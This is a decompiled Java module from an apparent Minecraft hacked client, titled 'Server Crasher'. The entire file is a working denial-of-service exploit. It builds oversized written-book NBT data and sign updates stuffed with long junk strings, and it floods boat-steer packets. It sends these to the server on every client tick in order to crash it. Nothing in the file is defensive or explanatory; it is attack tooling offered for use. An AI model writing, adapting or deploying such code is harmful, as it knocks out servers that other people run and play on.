package com.ares.hack.hacks.exploit;

import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import net.minecraft.network.play.client.CPacketSteerBoat;
import net.minecraft.network.play.client.CPacketUpdateSign;
import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketClickWindow;
import net.minecraft.inventory.ClickType;
import net.minecraftforge.fml.common.gameevent.TickEvent;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.init.Items;
import com.ares.utils.chat.ChatUtils;
import com.ares.hack.settings.settings.EnumSetting;
import com.ares.hack.settings.Setting;
import net.minecraft.util.text.ITextComponent;
import net.minecraft.item.ItemStack;
import com.ares.hack.categories.EnumCategory;
import com.ares.hack.hacks.BaseHack;

@Hack(name = "Server Crasher", description = "Methods of crashing servers", category = EnumCategory.EXPLOIT)
public class ServerCrasher extends BaseHack
{
    private ItemStack bookObj;
    private String message;
    private String color;
    private ITextComponent line1;
    private ITextComponent line2;
    private ITextComponent line3;
    private ITextComponent line4;
    private ITextComponent[] words;
    private Setting<Mode> mode;
    
    public ServerCrasher() {
        this.bookObj = null;
        this.message = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
        this.color = "red";
        this.line1 = ITextComponent.Serializer.func_150699_a("{\"text\":\"" + this.message + "\",\"color\":\"" + this.color + "\"}");
        this.line2 = ITextComponent.Serializer.func_150699_a("{\"text\":\"" + this.message + "\",\"color\":\"" + this.color + "\"}");
        this.line3 = ITextComponent.Serializer.func_150699_a("{\"text\":\"" + this.message + "\",\"color\":\"" + this.color + "\"}");
        this.line4 = ITextComponent.Serializer.func_150699_a("{\"text\":\"" + this.message + "\",\"color\":\"" + this.color + "\"}");
        this.words = new ITextComponent[] { this.line1, this.line2, this.line3, this.line4 };
        this.mode = new EnumSetting<Mode>("Mode", this, Mode.BOOK);
    }
    
    public void onEnabled() {
        /*SL:62*/ChatUtils.printMessage("Crashing", "red");
        /*SL:64*/if (this.mode.getValue() == Mode.BOOK) {
            /*SL:66*/this.bookObj = new ItemStack(Items.field_151099_bA);
            final NBTTagList list = /*EL:67*/new NBTTagList();
            final NBTTagCompound nbtTagCompound = /*EL:68*/new NBTTagCompound();
            final String func_111285_a = ServerCrasher.mc.func_110432_I().func_111285_a();
            final String s = /*EL:70*/"\n Woops \n";
            final String message = /*EL:71*/this.message;
            /*SL:72*/for (int v0 = 0; v0 < 50; ++v0) {
                final NBTTagString v = /*EL:73*/new NBTTagString(message);
                /*SL:74*/list.func_74742_a((NBTBase)v);
            }
            /*SL:76*/nbtTagCompound.func_74778_a("author", func_111285_a);
            /*SL:77*/nbtTagCompound.func_74778_a("title", "\n Woops \n");
            /*SL:78*/nbtTagCompound.func_74782_a("pages", (NBTBase)list);
            /*SL:79*/this.bookObj.func_77983_a("pages", (NBTBase)list);
            /*SL:80*/this.bookObj.func_77982_d(nbtTagCompound);
        }
    }
    
    @SubscribeEvent
    public void update(final TickEvent.ClientTickEvent v0) {
        /*SL:87*/if (!this.getEnabled()) {
            return;
        }
        /*SL:89*/if (ServerCrasher.mc.field_71441_e == null) {
            /*SL:91*/this.setEnabled(false);
            /*SL:92*/return;
        }
        try {
            /*SL:97*/if (this.mode.getValue() == Mode.BOOK) {
                ServerCrasher.mc.field_71439_g.field_71174_a.func_147297_a(/*EL:98*/(Packet)new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, this.bookObj, (short)0));
            }
            /*SL:99*/if (this.mode.getValue() == Mode.SIGN) {
                ServerCrasher.mc.field_71439_g.field_71174_a.func_147297_a(/*EL:100*/(Packet)new CPacketUpdateSign(ServerCrasher.mc.field_71439_g.func_180425_c(), this.words));
            }
            /*SL:101*/if (this.mode.getValue() == Mode.NEW) {
                /*SL:103*/for (int a1 = 0; a1 < 100; ++a1) {
                    ServerCrasher.mc.field_71439_g.field_71174_a.func_147297_a(/*EL:105*/(Packet)new CPacketSteerBoat(true, true));
                }
            }
            /*SL:108*/Thread.sleep(12L);
        }
        catch (Exception v) {
            /*SL:112*/v.printStackTrace();
        }
    }
    
    enum Mode
    {
        BOOK, 
        SIGN, 
        NEW;
    }
}
